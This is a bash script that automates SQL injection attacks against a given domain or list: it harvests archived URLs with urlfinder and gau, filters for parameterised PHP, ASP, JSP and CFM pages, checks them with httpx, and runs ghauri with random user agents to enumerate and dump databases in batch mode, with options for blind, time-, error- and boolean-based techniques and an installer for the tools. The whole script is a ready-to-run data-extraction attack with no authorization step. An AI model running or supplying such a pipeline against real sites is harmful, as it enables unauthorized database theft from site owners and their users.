#!/usr/bin/env bash

# Function to display usage message
display_usage() {
    echo "Usage:"
    echo "     $0 -d http://example.com -all"
    echo "     $0 -d http://example.com -t"
    echo "     $0 -l http://example.com -all"
    echo "     $0 -l http://example.com -t"
    echo "Techniques: -all, -b, -t, -e, -bb"
    echo "           all, Blind all, Time based, Error based, Boolean based"
    echo ""
    echo "Options:"
    echo "  -h               Display this help message"
    echo "  -d               Single site scan"
    echo "  -l               Multiple site scan"
    echo "  -c               Installing required tools"
    echo "  -i               Check if required tools are installed"
    exit 0
}

# Check if help is requested
if [[ "$1" == "-h" ]]; then
    display_usage
    exit 0
fi

# Function to check installed tools
check_tools() {
    tools=("ghauri" "urlfinder" "gau" "httpx" "uniq" "xargs" "wget" "sed")

    echo "Checking required tools:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo "$tool is installed at $(which $tool)"
        else
            echo "$tool is NOT installed or not in the PATH"
        fi
    done
}

# Check if tool installation check is requested
if [[ "$1" == "-i" ]]; then
    check_tools
    exit 0
fi

# Check if help is requested
if [[ "$1" == "-c" ]]; then
    sudo apt install unzip -y
    echo "urlfinder===================================="
    wget "https://github.com/projectdiscovery/urlfinder/releases/download/v0.0.3/urlfinder_0.0.3_linux_amd64.zip"
    unzip urlfinder_0.0.3_linux_amd64.zip
    sudo mv urlfinder /usr/local/bin/
    sudo rm -rf ./README.md urlfinder_0.0.3_linux_amd64.zip
    sudo chmod +x /usr/local/bin/urlfinder
    urlfinder -h
    echo "gau=================================="
    wget "https://github.com/lc/gau/releases/download/v2.2.4/gau_2.2.4_linux_amd64.tar.gz"
    sudo tar -xvzf gau_2.2.4_linux_amd64.tar.gz
    sudo mv gau /usr/local/bin/
    sudo chmod +x /usr/local/bin/gau
    sudo rm -rf LICENSE README.md
    gau -h
    echo "httpx=================================="
    wget "https://github.com/projectdiscovery/httpx/releases/download/v1.6.10/httpx_1.6.10_linux_amd64.zip"
    sudo unzip httpx_1.6.10_linux_amd64.zip
    sudo mv httpx /usr/local/bin/
    sudo chmod +x /usr/local/bin/httpx
    sudo rm -rf LICENSE.md README.md
    httpx -h
    echo "ghauri=================================="
    cd /opt/ && sudo git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri/
    sudo chmod +x setup.py
    sudo python3 -m pip install --upgrade -r requirements.txt --break-system-packages
    sudo python3 -m pip install -e . --break-system-packages
    sudo python3 setup.py install
    cd
    ghauri -h
    
    exit 0
fi


# Single domain
# all vulnerability
if [[ "$1" == "-d" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# All Blind
if [[ "$1" == "-d" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Error based
if [[ "$1" == "-d" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Time based
if [[ "$1" == "-d" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Boolean based
if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -fs fqdn -all && gau {} --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
fi



# Multi domain
# all vulnerability
if [[ "$1" == "-l" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BEST --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# All Blind
if [[ "$1" == "-l" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=BT --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Error based
if [[ "$1" == "-l" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=E --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Time based
if [[ "$1" == "-l" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --dump --batch
fi

# Boolean based
if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | sed 's,https?://,,')
    echo "$domain_Without_Protocol" | xargs -I {} sh -c 'urlfinder -d {} -all && gau {} --subs --providers wayback,commoncrawl,otx,urlscan' | uniq -u | sed 's/:[0-9]\+//' | grep -aiE '\.(php|asp|aspx|jsp|cfm)'| grep -a "[=&]" | httpx | uniq -u>sqli.$domain_Without_Protocol.txt;ghauri -m sqli.$domain_Without_Protocol.txt --technique=B --random-agent --confirm --force-ssl --dbs --dump --batch
fi
